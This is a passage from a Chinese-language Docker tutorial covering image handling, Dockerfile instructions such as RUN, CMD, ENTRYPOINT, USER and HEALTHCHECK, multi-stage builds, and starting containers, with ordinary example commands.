`jwilder/nginx-proxy`，前者往往意味着 Docker Registry 多用户环境下的用户名，后者则往往是对应的软件名。但这并非绝对，取决于所使用的具体 Docker Registry 的软件或服务。\n\n\n\n# 2. 使用镜像\n\n### 2.1 获取镜像\n\n```\ndocker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]\n```\n\n- Docker 镜像仓库地址：地址的格式一般是 `<域名/IP>[:端口号]`。默认地址是 Docker Hub。\n- 仓库名：如之前所说，这里的仓库名是两段式名称，即 `<用户名>/<软件名>`。对于 Docker Hub，如果不给出用户名，则默认为 `library`，也就是官方镜像。\n\n```\ndocker pull ubuntu:16.04\n16.04: Pulling from library/ubuntu\n```\n\n\n\n### 2.2 运行容器\n\n```\ndocker run -it --rm \\\n    ubuntu:16.04 \\\n    bash\n```\n\n- `-it`：这是两个参数，一个是 `-i`：交互式操作，一个是 `-t` 终端。我们这里打算进入 `bash` 执行一些命令并查看返回结果，因此我们需要交互式终端。\n- `--rm`：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 `docker rm`。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 `--rm` 可以避免浪费空间。\n- `ubuntu:16.04`：这是指用 `ubuntu:16.04` 镜像为基础来启动容器。\n- `bash`：放在镜像名后的是**命令**，这里我们希望有个交互式 Shell，因此用的是 `bash`\n\n\n\n### 2.3 列出镜像\n\n```\ndocker images\n```\n\n列表包含了 `仓库名`、`标签`、`镜像 ID`、`创建时间` 以及 `所占用的空间`。\n\n**镜像 ID** 则是镜像的唯一标识，一个镜像可以对应多个**标签**。\n\n\n\n### 2.4 虚悬镜像\n\n `docker pull` 可能导致这种情况，`docker build` 也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为 `<none>` 的镜像。这类无标签镜像也被称为 **虚悬镜像(dangling image)**\n\n\n\n一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。\n\n```\ndocker image prune\n```\n\n\n\n### 2.5 删除本地镜像\n\n如果要删除本地的镜像，可以使用 `docker image rm` 命令，其格式为：\n\n```\n$ docker image rm [选项] <镜像1> [<镜像2> ...]\n```\n\n####  \n\n# 3. Dockerfile 定制镜像\n\nDockerfile 是一个文本文件，其内包含了一条条的**指令(Instruction)**，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。\n\n\n\n### 3.1 构建镜像\n\n在 `Dockerfile` 文件所在目录执行：\n\n```\n$ docker build -t nginx:v3 .\n```\n\n\n\n这里我们使用了 `docker build` 命令进行镜像构建。其格式为：\n\n```\ndocker build [选项] <上下文路径/URL/->\n```\n\n\n\n### 3.2 镜像构建上下文（Context） \n\n上下文路径就是 docker build 指定的\n\n如果注意，会看到 `docker build` 命令最后有一个 `.`。`.` 表示当前目录，而 `Dockerfile` 就在当前目录，因此不少初学者以为这个路径是在指定 `Dockerfile` 所在路径，这么理解其实是不准确的。如果对应上面的命令格式，你可能会发现，这是在指定**上下文路径**。那么什么是上下文呢？\n\n\n\n首先我们要理解 `docker build` 的工作原理。Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具。Docker 的引擎提供了一组 REST API，被称为 Docker Remote API，而如 docker 命令这样的客户端工具，则是通过这组 API 与 Docker 引擎交互，从而完成各种功能。因此，虽然表面上我们好像是在本机执行各种 `docker` 功能，但实际上，一切都是使用的远程调用形式在服务端（Docker 引擎）完成。也因为这种 C/S 设计，让我们操作远程服务器的 Docker 引擎变得轻而易举。\n\n\n\n当我们进行镜像构建的时候，并非所有定制都会通过 `RUN` 指令完成，经常会需要将一些本地文件复制进镜像，比如通过 `COPY` 指令、`ADD` 指令等。而 `docker build` 命令构建镜像，其实并非在本地构建，而是在服务端，也就是 Docker 引擎中构建的。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？\n\n \n\n这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，`docker build` 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。\n\n\n\n如果在 `Dockerfile` 中这么写：\n\n```\nCOPY ./package.json /app/ \n```\n\n这并不是要复制执行 `docker build` 命令所在的目录下的 `package.json`，也不是复制 `Dockerfile` 所在目录下的 `package.json`，而是复制 **上下文（context）** 目录下的 `package.json`。\n\n \n\n因此，`COPY` 这类指令中的源文件的路径都是*相对路径*。这也是初学者经常会问的为什么 `COPY ../package.json /app` 或者 `COPY /opt/xxxx /app` 无法工作的原因，因为这些路径已经超出了上下文的范围，Docker 引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。\n\n\n\n现在就可以理解刚才的命令 `docker build -t nginx:v3 .` 中的这个 `.`，实际上是在指定上下文的目录，`docker build` 命令会将该目录下的内容打包交给 Docker 引擎以帮助构建镜像。\n\n\n\n 理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现 `COPY /opt/xxxx /app` 不工作后，于是干脆将 `Dockerfile` 放到了硬盘根目录去构建，结果发现 `docker build` 执行后，在发送一个几十 GB 的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让 `docker build` 打包整个硬盘，这显然是使用错误。\n\n\n\n一般来说，应该会将 `Dockerfile` 置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 `.gitignore` 一样的语法写一个 `.dockerignore`，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。 \n\n\n\n那么为什么会有人误以为 `.` 是指定 `Dockerfile` 所在目录呢？这是因为在默认情况下，如果不额外指定 `Dockerfile` 的话，会将上下文目录下的名为 `Dockerfile` 的文件作为 Dockerfile。\n\n\n\n这只是默认行为，实际上 `Dockerfile` 的文件名并不要求必须为 `Dockerfile`，而且并不要求必须位于上下文目录中，比如可以用 `-f ../Dockerfile.php` 参数指定某个文件作为 `Dockerfile`。\n\n \n\n当然，一般大家习惯性的会使用默认的文件名 `Dockerfile`，以及会将其置于镜像构建上下文目录中。\n\n\n\n### 3.3 dockerfile 指令\n\n+ FROM 指定基础镜像\n\n所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个 `nginx` 镜像的容器，再进行修改一样，基础镜像是必须指定的。而 `FROM` 就是指定**基础镜像**，因此一个 `Dockerfile` 中 `FROM` 是必备的指令，并且必须是第一条指令。\n\n在 Docker Store 上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如 nginx、redis、mongo、mysql、httpd、php、tomcat 等；也有一些方便开发、构建、运行各种语言应用的镜像，如 node、openjdk、python、ruby、golang 等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。\n\n\n\n如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 ubuntu、debian、centos、fedora、alpine 等，这些操作系统的软件库为我们提供了更广阔的扩展空间。\n\n除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 scratch。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。\n\n+ RUN 执行命令\n\n`RUN` 指令是用来执行命令行命令的。由于命令行的强大能力，`RUN` 指令在定制镜像时是最常用的指令之一。其格式有两种：\n\n\n+ shell 格式：`RUN <命令>`，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 `RUN` 指令就是这种格式。\n\n```\nRUN echo '<h1>Hello, Docker!</h1>' > /usr/share/nginx/html/index.html\n```\n\n- exec 格式：`RUN [\"可执行文件\", \"参数1\", \"参数2\"]`，这更像是函数调用中的格式。\n\n \n\n之前说过，Dockerfile 中每一个指令都会建立一层，`RUN` 也不例外。每一个 `RUN` 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，`commit` 这一层的修改，构成新的镜像。\n\n\n\n```\nFROM debian:jessie\n\nRUN buildDeps='gcc libc6-dev make' \\\n    && apt-get update \\\n    && apt-get install -y $buildDeps \\\n    && wget -O redis.tar.gz \"http://download.redis.io/releases/redis-3.2.5.tar.gz\" \\\n    && mkdir -p /usr/src/redis \\\n    && tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\\n    && make -C /usr/src/redis \\\n    && make -C /usr/src/redis install \\\n    && rm -rf /var/lib/apt/lists/* \\\n    && rm redis.tar.gz \\\n    && rm -r /usr/src/redis \\\n    && apt-get purge -y --auto-remove $buildDeps\n```\n\n\n\n 首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 `RUN` 对一一对应不同的命令，而是仅仅使用一个 `RUN` 指令，并使用 `&&` 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。\n\n\n\n并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 类的行尾添加 `\\` 的命令换行方式，以及行首 `#` 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。\n\n  \n\n此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 `apt` 缓存文件。这是很重要的一步，我们之前说过，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。\n\n\n\n+ COPY 复制文件\n\n格式：\n\n- `COPY <源路径>... <目标路径>`\n- `COPY [\"<源路径1>\",... \"<目标路径>\"]`\n\n\n\n`COPY` 指令将从构建上下文目录中 `<源路径>` 的文件/目录复制到新的一层的镜像内的 `<目标路径>` 位置。比如：\n\n```\nCOPY package.json /usr/src/app/\n```\n\n`<源路径>` 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 filepath.Match 规则，如：\n\n```\nCOPY hom* /mydir/\nCOPY hom?.txt /mydir/\n```\n\n\n\n`<目标路径>` 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 `WORKDIR`指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。\n\n此外，还需要注意一点，使用 `COPY` 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建相关文件都在使用 Git 进行管理的时候。\n\n\n\n+ ADD 更高级的复制文件\n\n`ADD` 指令和 `COPY` 的格式和性质基本一致。但是在 `COPY` 基础上增加了一些功能。\n\n\n\n 比如 `<源路径>` 可以是一个 `URL`，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 `<目标路径>` 去。下载后的文件权限自动设置为 `600`，如果这并不是想要的权限，那么还需要增加额外的一层 `RUN`进行权限调整，另外，如果下载的是个压缩包，需要解压缩，也一样还需要额外的一层 `RUN` 指令进行解压缩。所以不如直接使用 `RUN` 指令，然后使用 `wget` 或者 `curl` 工具下载，处理权限、解压缩、然后清理无用文件更合理。因此，这个功能其实并不实用，而且不推荐使用。\n\n\n\n+ CMD 容器启动命令 \n\n`CMD` 指令的格式和 `RUN` 相似，也是两种格式：\n\n- `shell` 格式：`CMD <命令>`\n\n- `exec` 格式：`CMD [\"可执行文件\", \"参数1\", \"参数2\"...]`\n\n- 参数列表格式：`CMD [\"参数1\", \"参数2\"...]`。在指定了 `ENTRYPOINT` 指令后，用 `CMD` 指定具体的参数。\n\n  \n\n之前介绍容器的时候曾经说过，Docker 不是虚拟机，容器就是进程。既然是进程，那么在启动容器的时候，需要指定所运行的程序及参数。`CMD` 指令就是用于指定默认的容器主进程的启动命令的。\n\n \n\n在运行时可以指定新的命令来替代镜像设置中的这个默认命令，比如，`ubuntu` 镜像默认的 `CMD` 是 `/bin/bash`，如果我们直接 `docker run -it ubuntu` 的话，会直接进入 `bash`。我们也可以在运行时指定运行别的命令，如 `docker run -it ubuntu cat /etc/os-release`。这就是用 `cat /etc/os-release` 命令替换了默认的 `/bin/bash` 命令了，输出了系统版本信息。\n\n\n\n在指令格式上，一般推荐使用 `exec` 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 `\"`，而不要使用单引号。\n\n\n\n如果使用 `shell` 格式的话，实际的命令会被包装为 `sh -c` 的参数的形式进行执行。比如：\n\n```\nCMD echo $HOME\n```\n\n在实际执行中，会将其变更为：\n\n```\nCMD [ \"sh\", \"-c\", \"echo $HOME\" ]\n```\n\n这就是为什么我们可以使用环境变量的原因，因为这些环境变量会被 shell 进行解析处理。\n\n\n\n提到 `CMD` 就不得不提容器中应用在前台执行和后台执行的问题。这是初学者常出现的一个混淆。\n\nDocker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 upstart/systemd 去启动后台服务，容器内没有后台服务的概念。\n\n一些初学者将 `CMD` 写为：\n\n```\nCMD service nginx start\n```\n\n然后发现容器执行后就立即退出了。甚至在容器内去使用 `systemctl` 命令结果却发现根本执行不了。这就是因为没有搞明白前台、后台的概念，没有区分容器和虚拟机的差异，依旧在以传统虚拟机的角度去理解容器。   \n\n对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。\n\n \n\n而使用 `service nginx start` 命令，则是希望 upstart 来以后台守护进程形式启动 `nginx` 服务。而刚才说了 `CMD service nginx start` 会被理解为 `CMD [ \"sh\", \"-c\", \"service nginx start\"]`，因此主进程实际上是 `sh`。那么当 `service nginx start` 命令结束后，`sh` 也就结束了，`sh` 作为主进程退出了，自然就会令容器退出。\n\n正确的做法是直接执行 `nginx` 可执行文件，并且要求以前台形式运行。比如：\n\n```\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n```\n\n\n\n+ ENTRYPOINT 入口点\n\n`ENTRYPOINT` 的目的和 `CMD` 一样，都是在指定容器启动程序及参数。`ENTRYPOINT` 在运行时也可以替代，不过比 `CMD` 要略显繁琐，需要通过 `docker run` 的参数 `--entrypoint` 来指定。\n\n \n\n当指定了 `ENTRYPOINT` 后，`CMD` 的含义就发生了改变，不再是直接的运行其命令，而是将 `CMD` 的内容作为参数传给 `ENTRYPOINT` 指令，换句话说实际执行时，将变为：\n\n```\n<ENTRYPOINT> \"<CMD>\"\n```\n\n那么有了 `CMD` 后，为什么还要有 `ENTRYPOINT` 呢？这种 `<ENTRYPOINT> \"<CMD>\"` 有什么好处么？让我们来看几个场景。\n\n\n\n+ 场景一：让镜像变成像命令一样使用\n\n假设我们需要一个得知自己当前公网 IP 的镜像，那么可以先用 `CMD` 来实现：\n\n```\nFROM ubuntu:16.04\nRUN apt-get update \\\n    && apt-get install -y curl \\\n    && rm -rf /var/lib/apt/lists/*\nCMD [ \"curl\", \"-s\", \"http://ip.cn\" ]\n```\n\n假如我们使用 `docker build -t myip .` 来构建镜像的话，如果我们需要查询当前公网 IP，只需要执行：\n\n```\n$ docker run myip\n当前 IP：61.148.226.66 来自：北京市 联通\n```\n\n嗯，这么看起来好像可以直接把镜像当做命令使用了，不过命令总有参数，如果我们希望加参数呢？比如从上面的 `CMD` 中可以看到实质的命令是 `curl`，那么如果我们希望显示 HTTP 头信息，就需要加上 `-i` 参数。那么我们可以直接加 `-i` 参数给 `docker run myip` 么？\n\n```\n$ docker run myip -i\ndocker: Error response from daemon: invalid header field value \"oci runtime error: container_linux.go:247: starting container process caused \\\"exec: \\\\\\\"-i\\\\\\\": executable file not found in $PATH\\\"\\n\".\n```\n\n我们可以看到可执行文件找不到的报错，`executable file not found`。之前我们说过，跟在镜像名后面的是 `command`，运行时会替换 `CMD` 的默认值。因此这里的 `-i` 替换了原来的 `CMD`，而不是添加在原来的 `curl -s http://ip.cn` 后面。而 `-i` 根本不是命令，所以自然找不到。\n\n\n\n现在我们重新用 `ENTRYPOINT` 来实现这个镜像：\n\n```\nFROM ubuntu:16.04\nRUN apt-get update \\\n    && apt-get install -y curl \\\n    && rm -rf /var/lib/apt/lists/*\nENTRYPOINT [ \"curl\", \"-s\", \"http://ip.cn\" ]\n```\n\n这次我们再来尝试直接使用 `docker run myip -i`：\n\n```\n$ docker run myip\n当前 IP：61.148.226.66 来自：北京市 联通\n\n$ docker run myip -i\nHTTP/1.1 200 OK\nServer: nginx/1.8.0\nDate: Tue, 22 Nov 2016 05:12:40 GMT\nContent-Type: text/html; charset=UTF-8\nVary: Accept-Encoding\nX-Powered-By: PHP/5.6.24-1~dotdeb+7.1\nX-Cache: MISS from cache-2\nX-Cache-Lookup: MISS from cache-2:80\nX-Cache: MISS from proxy-2_6\nTransfer-Encoding: chunked\nVia: 1.1 cache-2:80, 1.1 proxy-2_6:8006\nConnection: keep-alive\n\n当前 IP：61.148.226.66 来自：北京市 联通\n```\n\n可以看到，这次成功了。这是因为当存在 `ENTRYPOINT` 后，`CMD` 的内容将会作为参数传给 `ENTRYPOINT`，而这里 `-i` 就是新的 `CMD`，因此会作为参数传给 `curl`，从而达到了我们预期的效果。 \n\n  \n\n+ 场景二：应用运行前的准备工作\n\n 启动容器就是启动主进程，但有些时候，启动主进程前，需要一些准备工作。\n\n比如 `mysql` 类的数据库，可能需要一些数据库配置、初始化的工作，这些工作要在最终的 mysql 服务器运行之前解决。\n\n此外，可能希望避免使用 `root` 用户去启动服务，从而提高安全性，而在启动服务前还需要以 `root` 身份执行一些必要的准备工作，最后切换到服务用户身份启动服务。或者除了服务外，其它命令依旧可以使用 `root` 身份执行，方便调试等。\n\n这些准备工作是和容器 `CMD` 无关的，无论 `CMD` 为什么，都需要事先进行一个预处理的工作。这种情况下，可以写一个脚本，然后放入 `ENTRYPOINT` 中去执行，而这个脚本会将接到的参数（也就是 `<CMD>`）作为命令，在脚本最后执行。比如官方镜像 `redis` 中就是这么做的：\n\n```\nFROM alpine:3.4\n...\nRUN addgroup -S redis && adduser -S -G redis redis\n...\nENTRYPOINT [\"docker-entrypoint.sh\"]\n\nEXPOSE 6379\nCMD [ \"redis-server\" ] \n```\n\n\n\n+ ENV 设置环境变量\n\n格式有两种：\n\n- `ENV <key> <value>`\n\n- `ENV <key1>=<value1> <key2>=<value2>...`\n\n  \n\n这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 `RUN`，还是运行时的应用，都可以直接使用这里定义的环境变量。\n\n```\nENV NODE_VERSION 7.2.0\n\nRUN curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz\" \\\n  && curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\" \\\n\n```\n\n\n\n下列指令可以支持环境变量展开： `ADD`、`COPY`、`ENV`、`EXPOSE`、`LABEL`、`USER`、`WORKDIR`、`VOLUME`、`STOPSIGNAL`、`ONBUILD`。\n\n\n\n+ ARG 构建参数(构建环境的环境变量)\n\n格式：`ARG <参数名>[=<默认值>]`\n\n构建参数和 `ENV` 的效果一样，都是设置环境变量。所不同的是，`ARG` 所设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 `ARG` 保存密码之类的信息，因为 `docker history` 还是可以看到所有值的。\n\n`Dockerfile` 中的 `ARG` 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 `docker build` 中用 `--build-arg <参数名>=<值>` 来覆盖。\n\n\n\n+ VOLUME 定义匿名卷\n\n格式为：\n\n- `VOLUME [\"<路径1>\", \"<路径2>\"...]`\n- `VOLUME <路径>`\n\n为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 `Dockerfile` 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。\n\n```\nVOLUME /data\n```\n\n\n\n这里的 `/data` 目录就会在运行时自动挂载为匿名卷，任何向 `/data` 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：\n\n```\ndocker run -d -v mydata:/data xxxx\n```\n\n 在这行命令中，就使用了 `mydata` 这个命名卷挂载到了 `/data` 这个位置，替代了 `Dockerfile` 中定义的匿名卷的挂载配置。 \n\n\n\n+ EXPOSE 声明端口\n\n格式为 `EXPOSE <端口1> [<端口2>...]`。\n\n`EXPOSE` 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 `docker run -P`时，会自动随机映射 `EXPOSE` 的端口。\n\n\n\n要将 `EXPOSE` 和在运行时使用 `-p <宿主端口>:<容器端口>` 区分开来。`-p`，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 `EXPOSE` 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。\n\n\n\n+ WORKDIR 指定工作目录\n\n格式为 `WORKDIR <工作目录路径>`。\n\n使用 `WORKDIR` 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，`WORKDIR` 会帮你建立目录。\n\n\n\n之前提到一些初学者常犯的错误是把 `Dockerfile` 等同于 Shell 脚本来书写，这种错误的理解还可能会导致出现下面这样的错误：\n\n```\nRUN cd /app\nRUN echo \"hello\" > world.txt\n```\n\n如果将这个 `Dockerfile` 进行构建镜像运行后，会发现找不到 `/app/world.txt` 文件，或者其内容不是 `hello`。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 `Dockerfile` 中， **这两行 `RUN` 命令的执行环境根本不同，是两个完全不同的容器。**这就是对 `Dockerfile` 构建分层存储的概念不了解所导致的错误。\n\n\n\n之前说过每一个 `RUN` 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 `RUN cd /app` 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。\n\n因此如果需要改变以后各层的工作目录的位置，那么应该使用 `WORKDIR` 指令。\n\n \n\n+ USER 指定当前用户\n\n格式：`USER <用户名>`\n\n`USER` 指令和 `WORKDIR` 相似，都是改变环境状态并影响以后的层。`WORKDIR` 是改变工作目录，`USER`则是改变之后层的执行 `RUN`, `CMD` 以及 `ENTRYPOINT` 这类命令的身份。\n\n\n\n当然，和 `WORKDIR` 一样，`USER` 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。\n\n```\nRUN groupadd -r redis && useradd -r -g redis redis\nUSER redis\nRUN [ \"redis-server\" ]\n```\n\n \n\n如果以 `root` 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 `su` 或者 `sudo`，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 [`gosu`](https://github.com/tianon/gosu)。\n\n```\n# 建立 redis 用户，并使用 gosu 换另一个用户执行命令\nRUN groupadd -r redis && useradd -r -g redis redis\n# 下载 gosu\nRUN wget -O /usr/local/bin/gosu \"https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64\" \\\n    && chmod +x /usr/local/bin/gosu \\\n    && gosu nobody true\n# 设置 CMD，并以另外的用户执行\nCMD [ \"exec\", \"gosu\", \"redis\", \"redis-server\" ]\n```\n\n\n\n+ HEALTHCHECK 健康检查\n\n格式：\n\n- `HEALTHCHECK [选项] CMD <命令>`：设置检查容器健康状况的命令\n- `HEALTHCHECK NONE`：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令\n\n而自 1.12 之后，Docker 提供了 `HEALTHCHECK` 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。\n\n 当在一个镜像指定了 `HEALTHCHECK` 指令后，用其启动容器，初始状态会为 `starting`，在 `HEALTHCHECK` 指令检查成功后变为 `healthy`，如果连续一定次数失败，则会变为 `unhealthy`。\n\n \n\n`HEALTHCHECK` 支持下列选项：\n\n- `--interval=<间隔>`：两次健康检查的间隔，默认为 30 秒；\n- `--timeout=<时长>`：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；\n- `--retries=<次数>`：当连续失败指定次数后，则将容器状态视为 `unhealthy`，默认 3 次。\n\n**和 `CMD`, `ENTRYPOINT` 一样，`HEALTHCHECK` 只可以出现一次，如果写了多个，只有最后一个生效。**\n\n \n\n假设我们有个镜像是个最简单的 Web 服务，我们希望增加健康检查来判断其 Web 服务是否在正常工作，我们可以用 `curl` 来帮助判断，其 `Dockerfile` 的 `HEALTHCHECK` 可以这么写：\n\n```\nFROM nginx\nRUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*\nHEALTHCHECK --interval=5s --timeout=3s \\\n  CMD curl -fs http://localhost/ || exit 1\n```\n\n \n\n+ ONBUILD 为他人做嫁衣裳\n\n格式：`ONBUILD <其它指令>`。\n\n`ONBUILD` 是一个特殊的指令，它后面跟的是其它指令，比如 `RUN`, `COPY` 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。\n\n`Dockerfile` 中的其它指令都是为了定制当前镜像而准备的，唯有 `ONBUILD` 是为了帮助别人定制自己而准备的。\n\n \n\n### 3.4 docker多阶段构建 (多个 FROM as)\n\n我们构建 Docker 镜像时，一种方式是将所有的构建过程编包含在一个 `Dockerfile` 中，包括项目及其依赖库的编译、测试、打包等流程，这里可能会带来的一些问题：\n\n- `Dockerfile` 特别长，可维护性降低\n\n- 镜像层次多，镜像体积较大，部署时间变长\n\n- 源代码存在泄露的风险\n\n  \n\nDocker v17.05 开始支持多阶段构建 (`multistage builds`)。\n\n编写 `Dockerfile` 文件\n\n```\nFROM golang:1.9-alpine as builder\n\nRUN apk --no-cache add git\n\nWORKDIR /go/src/github.com/go/helloworld/\n\nRUN go get -d -v github.com/go-sql-driver/mysql\n\nCOPY app.go .\n\nRUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .\n\nFROM alpine:latest as prod\n\nRUN apk --no-cache add ca-certificates\n\nWORKDIR /root/\n\nCOPY --from=0 /go/src/github.com/go/helloworld/app .\n\nCMD [\"./app\"]\n```\n\n构建镜像\n\n```\n$ docker build -t go/helloworld:3 .\n```\n\n\n\n+ 只构建某一阶段的镜像\n\n我们可以使用 `as` 来为某一阶段命名，例如\n\n```\nFROM golang:1.9-alpine as builder\n```\n\n例如当我们只想构建 `builder` 阶段的镜像时，我们可以在使用 `docker build` 命令时加上 `--target`参数即可\n\n```\n$ docker build --target builder -t username/imagename:tag .\n```\n\n\n\n+ 构建时从其他镜像复制文件\n\n上面例子中我们使用 `COPY --from=0 /go/src/github.com/go/helloworld/app .` 从上一阶段的镜像中复制文件，我们也可以复制任意镜像中的文件。\n\n```\n$ COPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf\n```\n\n\n\n### 3.5 其它制作镜像的方式\n\n\n\n+  `docker save` 和 `docker load`\n\nDocker 还提供了 `docker load` 和 `docker save` 命令，用以将镜像保存为一个 `tar` 文件，然后传输到另一个位置上，再加载进来。这是在没有 Docker Registry 时的做法，现在已经不推荐，镜像迁移应该直接使用 Docker Registry，无论是直接使用 Docker Hub 还是使用内网私有 Registry 都可以。\n\n\n\n+ 保存镜像\n\n使用 `docker save` 命令可以将镜像保存为归档文件。\n\n比如我们希望保存这个 `alpine` 镜像。\n\n```\n$ docker image ls alpine\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\nalpine              latest              baa5d63471ea        5 weeks ago         4.803 MB\n```\n\n保存镜像的命令为：\n\n```\n$ docker save alpine | gzip > alpine-latest.tar.gz\n```\n\n然后我们将 `alpine-latest.tar.gz` 文件复制到了到了另一个机器上，可以用下面这个命令加载镜像：\n\n```\n$ docker load -i alpine-latest.tar.gz\nLoaded image: alpine:latest\n```\n\n \n\n如果我们结合这两个命令以及 `ssh` 甚至 `pv` 的话，利用 Linux 强大的管道，我们可以写一个命令完成从一个机器将镜像迁移到另一个机器，并且带进度条的功能：\n\n```\ndocker save <镜像名> | bzip2 | pv | ssh <用户名>@<主机名> 'cat | docker load'\n```\n\n\n\n+ docker export save 区别\n\n- docker save是将一个镜像导出成一个tarball文件，对应的导入命令是docker load，将该文件导入成一个镜像。 \n- docker export是将一个容器导出成一个tarball文件，对应的导入命令时docker import，将该文件导入成一个镜像（注意不是容器）。  容器快照将会丢弃所有的历史记录和元数据信息\n\n\n\n# 4. 操作容器\n\n### 4.1 新建并启动 \n\n所需要的命令主要为 `docker run`。\n\n```\n$ docker run -t -i ubuntu:14.04 /bin/bash\nroot@af8bae53bdd3:/#\n```\n\n其中，`-t` 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， `-i` 则让容器的标准输入保持打开。\n\n\n\n当利用 `docker run` 来创建容器时，Docker 在后台运行的标准操作包括：\n\n- 检查本地是否存在指定的镜像，不存在就从公有仓库下载\n- 利用镜像创建并启动一个容器\n- 分配一个文件系统，并在只读的镜像层外面挂载一层可读写层\n- 从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去\n- 从地址池配置一个 ip 地址给容器\n- 执行用户指定的应用程序\n- 执行完毕后容器被终止\n\n\n\n### 4.2 启动已终止容器\n\n可以利用 `docker container start` 命令，直接将一个已经终止的容器启动运行。\n\n\n\n### 4.3 后台运行\n\n更多的时候，需要让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 `-d` 参数来实现。\n\n```\n docker run -d ubuntu:17.10 /bin/sh -c \"while true; 